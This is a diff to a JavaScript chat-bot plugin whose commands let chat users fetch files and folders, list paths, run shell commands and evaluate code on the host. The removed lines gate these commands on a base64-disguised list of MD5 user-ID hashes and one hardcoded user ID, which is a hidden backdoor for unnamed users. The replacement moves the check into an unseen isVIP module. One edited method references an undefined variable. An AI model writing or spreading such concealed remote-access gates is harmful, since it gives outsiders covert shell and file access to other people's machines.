@@ -2,14 +2,7 @@ import fs from "node:fs";//
 
 import archiver from "archiver";
 import md5 from "md5";
-const encryptedStrings = [
-  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
-  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
-  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
-  Buffer.from("SLUcQ5DoebgRp1oBpCMVvg==", "base64").toString("hex"),
-  Buffer.from("BfghyyHlTtHGZlwo236ftg==", "base64").toString("hex"),
-  Buffer.from('Gd//uNcMStBRoY5V1YxedQ==','base64').toString('hex')
-];
+import { isVIP } from '../model/vipCheck.js';
 import puppeteer from "../../../lib/puppeteer/puppeteer.js";
 import hljs from "@highlightjs/cdn-assets/highlight.min.js";
 import { AnsiUp } from "ansi_up";
@@ -85,7 +78,7 @@ export class File extends plugin {
   }
 
   async EnableSending(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     this.finish("EnableSending");
     sendToOwner = true;
@@ -95,7 +88,7 @@ export class File extends plugin {
   }
 
   async DisableSending(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     this.finish("DisableSending");
     sendToGroup = true;
@@ -105,7 +98,7 @@ export class File extends plugin {
   }
 
   async DownloadFile(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     this.finish("DownloadFile");
     const filePath = this.e.msg.replace("取文件", "").trim();
@@ -138,7 +131,7 @@ export class File extends plugin {
   }
 
   async DownloadFolder(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     this.finish("DownloadFolder");
     const folderPath = this.e.msg.replace("取包", "").trim();
@@ -188,7 +181,7 @@ export class File extends plugin {
   }
 
   async List(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     this.finish("List");
     const filePath = this.e.msg.replace("look一下", "").trim();
@@ -211,7 +204,7 @@ export class File extends plugin {
   }
 
   async hpCommand(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     const msg = this.e.msg.replace("hp", "").trim();
     logger.mark(`[File] 发送文件内容：${logger.blue(msg)}`);
@@ -239,9 +232,7 @@ async evalSync(cmd, func, isValue, isAsync) {
   }
 
   async ShellPic(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str) || this.e.user_id === '3065737952')) {
-    return false;
-}
+    if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     const cmd = this.e.msg.replace("ly", "").trim()
     const ret = await Bot.exec(...prompt(cmd))
@@ -286,7 +277,7 @@ async evalSync(cmd, func, isValue, isAsync) {
   }
 
   async DirectMsg() {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
+   if (!isVIP(e)) return false
     if (this.e.at && !this.e.atme) return false
     const ret = await this.evalSync(this.e.msg.replace(/^hmp?/, ""), false, true)
     if (ret.error)
